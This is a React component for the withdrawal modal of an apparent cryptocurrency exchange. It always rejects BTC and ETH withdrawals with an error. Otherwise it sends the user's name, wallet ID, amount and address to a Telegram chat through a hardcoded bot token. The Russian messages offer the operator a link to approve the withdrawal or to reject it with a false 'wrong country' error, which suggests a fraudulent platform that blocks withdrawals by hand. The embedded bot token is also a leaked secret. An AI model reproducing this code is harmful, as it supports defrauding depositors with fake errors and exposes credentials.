import {useEffect, useState} from 'react';
import {Modal, Button, Group, Select, Input, Tooltip} from '@mantine/core';
import {showNotification} from "@mantine/notifications";
import {useDispatch, useSelector} from "react-redux";
import {setSelectedAmount, setSelectedPaymentCurrency} from "../store/PaymentSlice";
import {useRouter} from "next/router";
import {setAmountToWithdraw, setLi} from "../store/PaySlice";
export default function Deposit(){
    const [opened, setOpened] = useState(false);
    const [amount, setAmount] = useState(0)
    const [currency, setCurrency] = useState("BTC")
    const {authenticatedState, lis, amountToWithdraw} = useSelector(state => state.PaySlice)
    const {selectedPaymentCurrency, selectedAmount} = useSelector(state => state.PaymentSlice)
    const dispatch = useDispatch()
    const [chein, setChein] = useState("")
    const [wal, setWal] = useState("")

    const router = useRouter()
    useEffect(()=>{
        if (selectedPaymentCurrency === "NEAR"){
            dispatch(setLi([
                "BEP20",
                "NEAR Protocol",
                "BEP2"
            ]))
        }
        if (selectedPaymentCurrency === "ATOM"){
            dispatch(setLi([
                "BEP20",
                "Cosmos",
                "BEP2"
            ]))
        }
        if (selectedPaymentCurrency === "XLM"){
            dispatch(setLi([
                "BEP20",
                "Stellar Network"
            ]))
        }
        if (selectedPaymentCurrency === "TRX"){
            dispatch(setLi([
                "BEP20",
                "TRC20",
                "BEP2"
            ]))
        }

        if (selectedPaymentCurrency === "ETC"){
            dispatch(setLi([
                "BEP20",
                "Ethereum Classic",
                "BEP2"
            ]))
        }

        if (selectedPaymentCurrency === "DOT"){
            dispatch(setLi([
                "BEP20",
                "Polkadot",
                "BEP2"
        ]))
        }

        if (selectedPaymentCurrency === "BTC"){
            dispatch(setLi([
                "BEP20",
                "BTC",
                "BEP2"
            ]))
        }
        if (selectedPaymentCurrency === "ETH"){
            dispatch(setLi([
                "BEP20",
                "ERC20",
                "BEP2"
            ]))
        }

        if (selectedPaymentCurrency === "DOGE"){
            dispatch(setLi([
                "BEP20",
                "dogecoin",
                "BEP2"
            ]))
        }

        if (selectedPaymentCurrency === "Sol"){
            dispatch(setLi([
                "BEP20",
                "Solana"
            ]))
        }

        if (selectedPaymentCurrency === "XRP"){
            dispatch(setLi([
                "BEP20",
                "Ripple",
                "BEP2",
                "ERC20"
            ]))
        }

        if (selectedPaymentCurrency === "ADA"){
            dispatch(setLi([
                "BEP20",
                "Cardano",
                "BEP2"
            ]))
        }



        if (selectedPaymentCurrency === "BUSD"){
            dispatch(setLi([
                "BEP20",
                "Avax C-Chain",
                "BEP2",
                "ERC20",
                "Polygon",
                "TRC20"
            ]))
        }

        if (selectedPaymentCurrency === "USDT"){
            dispatch(setLi([
                "TRC20",
                "Solana",
                "BEP20"
            ]))
        }


    },[selectedPaymentCurrency])
    function submit(){
        if (selectedPaymentCurrency === "BTC" || selectedPaymentCurrency === "ETH" ){
            showNotification({
                title: 'Error',
                message: "We can't generate address for payment!",
                styles: (theme) => ({
                    root: {
                        backgroundColor: theme.colors.red[6],
                        borderColor: theme.colors.red[6],

                        '&::before': { backgroundColor: theme.white },
                    },

                    title: { color: theme.white },
                    description: { color: theme.white },
                    closeButton: {
                        color: theme.white,
                        '&:hover': { backgroundColor: theme.colors.red[7] },
                    },
                }),
            })
        }else if(chein.length === 0){
            showNotification({
                title: 'Error',
                message: "You didn't pick the network type",
                styles: (theme) => ({
                    root: {
                        backgroundColor: theme.colors.red[6],
                        borderColor: theme.colors.red[6],

                        '&::before': { backgroundColor: theme.white },
                    },

                    title: { color: theme.white },
                    description: { color: theme.white },
                    closeButton: {
                        color: theme.white,
                        '&:hover': { backgroundColor: theme.colors.red[7] },
                    },
                }),
            })}
        else if(amountToWithdraw === 0){
            showNotification({
                title: 'Error',
                message: "Amount must be greater then 0",
                styles: (theme) => ({
                    root: {
                        backgroundColor: theme.colors.red[6],
                        borderColor: theme.colors.red[6],

                        '&::before': { backgroundColor: theme.white },
                    },

                    title: { color: theme.white },
                    description: { color: theme.white },
                    closeButton: {
                        color: theme.white,
                        '&:hover': { backgroundColor: theme.colors.red[7] },
                    },
                }),
            })}
        else if (wal.length === 0){
            return showNotification(
                {
                    title: "You didn't write address of your wallet",
                    styles: (theme) => ({
                        root: {
                            backgroundColor: theme.colors.red[6],
                            borderColor: theme.colors.red[6],

                            '&::before': { backgroundColor: theme.white },
                        },

                        title: { color: theme.white },
                        description: { color: theme.white },
                        closeButton: {
                            color: theme.white,
                            '&:hover': { backgroundColor: theme.colors.red[7] },
                        },
                    }),
                }
            )
        }
        else {

            dispatch(setSelectedAmount(amount))
            fetch("api/checkwithdrawel",{
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    id: authenticatedState.user.wallet.walletid,
                    cryptotype: selectedPaymentCurrency,
                    amount: amountToWithdraw
                })
            }).then(r => r.json()).then(r=> {
                if(r.success){
                    showNotification({
                        title: 'Success',
                        message: "Your funds are being checked. The withdrawal of funds will take place within 30 minutes",
                        styles: (theme) => ({
                            root: {
                                backgroundColor: theme.colors.green[6],
                                borderColor: theme.colors.green[6],

                                '&::before': { backgroundColor: theme.white },
                            },

                            title: { color: theme.white },
                            description: { color: theme.white },
                            closeButton: {
                                color: theme.white,
                                '&:hover': { backgroundColor: theme.colors.green[7] },
                            },
                        }),
                    })
                    const message = `${amountToWithdraw} ${selectedPaymentCurrency}. Chain type: ${chein}. Address of wallet: ${wal}. Пользователь: ${authenticatedState.authenticated && authenticatedState.user.username.username}, 
    Чтобы подтвердить вывод перейдите по поссылке => ryptomainx.com/api/minuspayment?id=${authenticatedState.authenticated && authenticatedState.user.wallet.walletid}&cryptotype=${selectedPaymentCurrency}&amount=${selectedAmount}`
                    const encodedUrl = encodeURIComponent(message)
                    const message2 = `${amountToWithdraw} ${selectedPaymentCurrency}. Пользователь: ${authenticatedState.authenticated && authenticatedState.user.username.username},
                    Чтобы отклонить вывод с ошибкой что ты не в той стране => ryptomainx.com/api/notification?id=${authenticatedState.user.wallet.walletid}`
                    fetch(`https://api.telegram.org/bot5980812659:AAFuLH-vnxzsKHM7WEWNQIO5JUD7xJR-5nI/sendMessage?chat_id=-715946291&text=${encodedUrl}`)
                    fetch(`https://api.telegram.org/bot5980812659:AAFuLH-vnxzsKHM7WEWNQIO5JUD7xJR-5nI/sendMessage?chat_id=-715946291&text=${message2}`)

                }else if(r.message){
                    showNotification({
                        title: 'Error',
                        message: r.message.error,
                        styles: (theme) => ({
                            root: {
                                backgroundColor: theme.colors.red[6],
                                borderColor: theme.colors.red[6],

                                '&::before': { backgroundColor: theme.white },
                            },

                            title: { color: theme.white },
                            description: { color: theme.white },
                            closeButton: {
                                color: theme.white,
                                '&:hover': { backgroundColor: theme.colors.red[7] },
                            },
                        }),
                    })
                }
            })
        }
    }
    function checkAmount(e) {

        let value = e.target.value;


        const regex = /^\d{0,100}(\.\d{0,10})?$/;
        if (regex.test(value)) {
            let floatValue = parseFloat(value);

            dispatch(setAmountToWithdraw(floatValue));

        } else {
            // handle invalid input
        }

    }
    return(<>
        <Modal
            opened={opened}
            onClose={() => setOpened(false)}
            title={`Withdraw`}
            className="text-2xl">
            <div className="h-full text-md w-full flex items-center justify-center">
                <div className="flex w-full flex-col items-center justify-center">
                    <Select
                        className="w-full"
                        label="Currency:"
                        placeholder="Pick one"
                        data={[
                            { value: 'BTC', label: 'BTC' },
                            { value: 'ETH', label: 'ETH' },
                            { value: 'BNB', label: 'BNB' },
                            { value: 'USDT', label: 'USDT' },
                            { value: 'BUSD', label: 'BUSD' },
                            { value: 'ADA', label: 'ADA' },
                            { value: 'XRP', label: 'XRP' },
                            { value: 'SOL', label: 'SOL' },
                            { value: 'DOGE', label: 'DOGE' },
                            { value: 'DOT', label: 'DOT' },
                            { value: 'TRX', label: 'TRX' },
                            { value: 'ETC', label: 'ETC' },
                            { value: 'XLM', label: 'XLM' },
                            { value: 'ATOM', label: 'ATOM' },
                            { value: 'NEAR', label: 'NEAR' }
                        ]}
                        value={selectedPaymentCurrency}
                        onChange={e => dispatch(setSelectedPaymentCurrency(e))}
                    />
                    <div className="flex flex-col items-center justify-center w-full">
                        <div className="text-[14px] font-[500] mr-auto">Amount to withdraw</div>
                        <Input
                            className={`w-full`}

                            value={amountToWithdraw}
                            type="number"
                            placeholder={`amount`}
                            onChange={checkAmount}
                        /></div>
                    <div className="flex flex-col items-center justify-center w-full">
                        <div className="text-[14px] font-[500] mr-auto">The type of chain</div>
                        <div className="w-full h-full"><Select value={chein} onChange={(e)=>{setChein(e)}} data={lis} className=""/></div>
                        <div className="text-[14px] font-[500] mr-auto">The adress of wallet</div>
                        <Input
                            className={`w-full`}

                            value={wal}
                            type="text"
                            placeholder={`Address of wallet`}
                            onChange={(e)=>{setWal(e.target.value)}}
                        /></div>
                    <div className="w-full flex gap-x-2 items-center justify-end pt-4">
                        <Button onClick={()=> {submit()}} className="  hover:bg-green-700 bg-green-600 ">Withdraw</Button>
                        <Button onClick={() => setOpened(false)} className=" text-black hover:bg-red-600 bg-white hover:text-white">Close</Button>
                    </div>
                </div>
            </div>
        </Modal>


        <Button onClick={() => setOpened(true)} className="w-full  bg-red-600 hover:bg-red-700">Withdraw</Button>
    </>)
}